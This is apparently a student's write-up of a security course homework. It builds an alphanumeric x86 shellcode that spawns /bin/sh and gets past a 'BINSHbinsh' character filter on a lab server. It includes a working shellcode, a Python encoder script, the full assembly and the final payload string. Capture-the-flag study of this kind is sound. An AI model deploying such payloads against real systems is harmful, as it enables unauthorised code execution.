---
title: alnum Writeup
category: memo
slug: alnum-writeup
date: 2015-01-21
---
Security Programming Homework 2-2

## Alphanumeric Shellcode Executor

Once connect to the service, it will prompt the following message:

```bash
$ nc secprog.cs.nctu.edu.tw 10022
Welcome to AlphaNumeric Shellcode executor!
You can only use 0-9 A-Z a-z.
"BINSH" and "binsh" are filter out.

Please input your shellcode:
```

This is a alphanumeric shellcode executor, it sucks in the input string which
only contains alphanumerics (except the characters in "BINSHbinsh"). The server
code and the code below may look alike:

```c
#include stdio.h
#include stdlib.h
#include string.h

int main(void) {
    char shellcode[];
    char *invalid = "BINSHbinsh";
    int i = 0;

    scanf("%s", shellcode);

    for(i = 0; i < strlen(shellcode); i++) {
        if(strchr(shellcode, invalid[i]) != NULL) {
            puts("Invalid input! byebye...\n");
            exit(0);
        }
    }

    (*(void (*)()) shellcode)();

    return 0;
}
```

After checking the string, the program counter will jump to the starting point
of the shellcode, and executes it. The shellcode is in stack, so Data Execution
Prevention (DEP) must not be enabled.

## Encode The Shellcode

I found a helpful Japanese article, which goes through all the processes of
generating an alphanumeric shellcode. But there is one more restriction
(excluding "BINSHbinsh") in the Homework.

First, the most important thing is that finding a workable shellcode that opens
a shell. Following is a normal shellcode that executes `/bin/sh`. It pushes
the instructions into stack and finally jumps to `esp` to execute the code it
just pushed.

```nasm
            /* test.s */
        .intel_syntax noprefix
        .globl _start
_start:
        push 0x80cd0b42
        push 0x8de18953
        push 0x52e3896e
        push 0x69622f68
        push 0x68732f2f
        push 0x6852d231
        jmp esp
```

To prove that it can actually open a shell:

```bash
$ gcc -m32 -nostdlib test.s
$ ./a.out
sh-4.3$
```

But when you look into the content of the binary, you'll discover that it is
not alphanumeric, it contains many non-printable characters. Sadly, most of the
printable characters are not allowed in the problem, i.e. "BINSHbinsh".

```bash
$ objdump -s -j .text a.out

a.out:     file format elf32-i386

Contents of section .text:
 8048098 68420bcd 80685389 e18d686e 89e35268  hB...hS...hn..Rh
 80480a8 682f6269 682f2f73 686831d2 5268ffe4  h/bih//shh1.Rh..
```

The instructions listed below are valid because their opcode are in the range
of alphanumerics.

```text
30      XOR r/m8 r8
31      XOR r/m16/32 r16/32
32      XOR r8 r/m8
33      XOR r16/32 r/m16/32
34      XOR AL imm8
35      XOR eAX imm16/32
38      CMP r/m8 r8
39      CMP r/m16/32 r16/32
40+r    INC r16/32    (except for eax, edx)
48+r    DEC r16/32    (except for eax, ecx, esi)
50+r    PUSH r16/32   (except for ebx)
58+r    POP r16/32    (only for eax, ecx, edx)
61      POPAD
6a      PUSH imm8
6b      IMUL r16/32 r/m16/32 imm8
70-7a   JO/JNO/JB/JNB/JZ/JNZ/JNA/JA/JS/JNS/JP rel8
```

We cannot push 32/16-bit immediate value directly into stack, because the
opcode of the instruction is invaild. Also, the immediate value which pushed
into the stack is invalid, either. That kind Japanese provided a neat Python
script that automatically generates some valid values. The result of XORed of
the values is the original value we want to push into the stack. Then we can
XOR these value with the register to store the value we want. This Python
script only promises that the decomposite vaules are alphanumerics. In order to
exclude "BINSHbinsh" in the shellcode, that Python script must be patched to
meet the requirement.

```python
#!/usr/bin/env python
# decomposite.py
#
import sys
import struct

word = int(sys.argv[1], 16)

alnum = range(0x30, 0x3a) + range(0x41, 0x5b) + range(0x61, 0x7b)
allowed = [ i for i in alnum if chr(i) not in "BINSHbinsh" ]    # patch

chunk = struct.pack('<I', word)
x = ''
y = ''
z = ''

for c in map(ord, chunk):
    if c >= 0x80:
        z += '\xff'
        c ^= 0xff
    else:
        z += '\x00'
    for i in allowed:
        if i^c in allowed:
            x += chr(i)
            y += chr(i^c)
            break

print hex(struct.unpack('<I', x)[0])
print hex(struct.unpack('<I', y)[0])
print hex(struct.unpack('<I', z)[0])
```

With this handy script, we can get rid of many invalid characters.

```text
[origin]: 0x80cd0b42
0x30433230
0x4f713972
0xffff0000
[origin]: 0x8de18953
0x31443030
0x435a4663
0xffffff00
[origin]: 0x52e3896e
0x31443034
0x6358465a
0xffff00
[origin]: 0x69622f68
0x30304330
0x59526c58
0x0
[origin]: 0x68732f2f
0x30304343
0x58436c6c
0x0
[origin]: 0x6852d231
0x30314141
0x58636c70
0xff00
```

## Strategy

So the strategy of generating an alphanumeric shellcode is:

1. Clear all registers
1. Make some register to be `0xffffffff` for convenience
1. `XOR` register with immediate values to shape the wanted value
1. `PUSH` the register into the stack
1. Do some minor change through XORing byte by byte
1. `PUSH esp` into the stack
1. Jump to the top of the stack by calling `RET`

You might wonder: why `RET` can be used? Actually it can't. So we place a
dummy value there, and patch it when executing the shellcode. The total length
of the shellcode should be carefully calculated in order to patch the right
byte where the dummy value resides. Otherwise, our happy friend (core dump)
will show up.

## Patch Patch Patch

The almighty Japanese had already provided a prototype for us! Thanks bro! But
still there are some parts must be patched to pass the check. All I have done
is that:

-  Replace the invalid immediate vaule
-  Replace `esi` with `edi` in `patch_ret`
-  Replace `ebx` and `edx` with `esi` when pushing zero into the stack
-  Eliminate 5 lines of `dec ecx`, and increase the length of the shellcode
-  Re-calculate the position of the dummy value.

And the result is:

```nasm
        /* alnum.s */
        .intel_syntax noprefix
        .globl _start
_start:
        /* set buffer register to ecx */
        push eax
        pop ecx

prepare_registers:
        push 0x30
        pop eax
        xor al, 0x30
                  /* omit eax, ecx */
        push eax  /* edx = 0 */
        push eax  /* ebx = 0 */
        push eax
        push eax
        push eax  /* esi = 0 */
        push ecx  /* edi = buffer */
        popad
        dec edx   /* edx = 0xffffffff */

patch_ret:
        /* garbage */
        push eax
        xor eax, 0x30303030

        /* 0x44 ^ 0x78 ^ 0xff == 0xc3 (ret) */
        push edx
        pop eax
        xor al, 0x44
        push 0x30
        pop ecx
        xor [edi+2*ecx+0x30], al

build_stack:
        /* push 0x80cd0b42 */
        push esi
        pop eax
        xor eax, 0x30433230
        xor eax, 0x4f713972
        push eax
        push esp
        pop ecx
        inc ecx
        inc ecx
        xor [ecx], dh
        inc ecx
        xor [ecx], dh

        /* push 0x8de18953 */
        push esi
        pop eax
        xor eax, 0x31443030
        xor eax, 0x435a4663
        push eax
        push esp
        pop ecx
        inc ecx
        xor [ecx], dh
        inc ecx
        xor [ecx], dh
        inc ecx
        xor [ecx], dh

        /* push 0x52e3896e */
        push esi
        pop eax
        xor eax, 0x31443034
        xor eax, 0x6358465a
        push eax
        push esp
        pop ecx
        inc ecx
        xor [ecx], dh
        inc ecx
        xor [ecx], dh

        /* push 0x69622f68 */
        push esi
        pop eax
        xor eax, 0x30304330
        xor eax, 0x59526c58
        push eax

        /* push 0x68732f2f */
        push esi
        pop eax
        xor eax, 0x30304343
        xor eax, 0x58436c6c
        push eax

        /* push 0x6852d231 */
        push esi
        pop eax
        xor eax, 0x30314141
        xor eax, 0x58636c70
        push eax
        push esp
        pop ecx
        inc ecx
        xor [ecx], dh

        push esp

ret:
        .byte 0x78
```

It is time to assemble the assembly code into the real executable! After that
we can check whether the `.text` section consists of all printable character
or not.

```bash
$ gcc -m32 -nostdlib alnum.s -o alnum
$ objdump -s -j .text alnum

alnum:     file format elf32-i386

Contents of section .text:
8048098 50596a30 58343050 50505050 51614a50  PYj0X40PPPPPQaJP
80480a8 58505850 58353030 30303530 30303035  XPXPX50000500005
80480b8 30303030 35303030 30525834 446a3059  000050000RX4Dj0Y
80480c8 30444f44 56583530 32433035 7239714f  0DODVX502C05r9qO
80480d8 50545941 41303141 30315658 35303044  PTYAA01A01VX500D
80480e8 31356346 5a435054 59413031 41303141  15cFZCPTYA01A01A
80480f8 30315658 35343044 31355a46 58635054  01VX540D15ZFXcPT
8048108 59413031 41303156 58353043 30303558  YA01A01VX50C005X
8048118 6c525950 56583543 43303035 6c6c4358  lRYPVX5CC005llCX
8048128 50565835 41413130 35706c63 58505459  PVX5AA105plcXPTY
8048138 41303154 78                          A01Tx
```

Using the following command to check whether the alpanumeric shellcode contains
"BINSHbinsh" or not.

```bash
$ echo \
'PYj0X40PPPPPQaJP50000RX4Dj0Y0DO0VX502C05r9qOPTYAA01A01VX500D15cFZCPTYA01A01A01VX540D15ZFXcPTYA01A01VX50C005XlRYPVX5CC005llCXPVX5AA105plcXPTYA01Tx' | grep [BINSHbinsh]
```

Nothing showed up! That means there is no character of "BINSHbinsh".  And the
alphanumeric shellcode is only 151 characters long. So let's put the shellcode
into our simple shellcode executor:

```c
/* shellcode.c */

int main(void)
{
    char shellcode[] = "PYj0X40PPPPPQaJPXPXPX50000500005000050000RX4Dj0Y0DODVX502C05r9qOPTYAA01A01VX500D15cFZCPTYA01A01A01VX540D15ZFXcPTYA01A01VX50C005XlRYPVX5CC005llCXPVX5AA105plcXPTYA01Tx";

    (*(void (*)())shellcode)();
}
```

Do not forget we are on 32-bit machine and the shellcode is stored in the
stack. To be able to execute the shellcode on the stack, one must disable DEP
during the compilation time.

```bash
$ gcc -m32 -z execstack -o shellcode shellcode.c
$ ./shellcode
sh-4.3$
```

Bingo! Now submit the alphanumeric shellcode to the server, and cat the flag!

## Flag

```text
SECPROG{IncredibleASMProgrammer}
```

## References

-  [x86 alphanumeric shellcodeを書いてみる][1]
-  [x86 alphanumeric shellcode encoderを書いてみる][2]
-  [Hacking/Shellcode/Alphanumeric/x86 printable opcodes][3]
-  [Encoding Real x86 Instructions][4]

[1]: http://inaz2.hatenablog.com/entry/2014/07/11/004655
[2]: http://inaz2.hatenablog.com/entry/2014/07/13/025626
[3]: http://skypher.com/wiki/index.php?title=X86_alphanumeric_opcodes
[4]: http://www.c-jump.com/CIS77/CPU/x86/lecture.html#X77_0100_sib_byte_layout
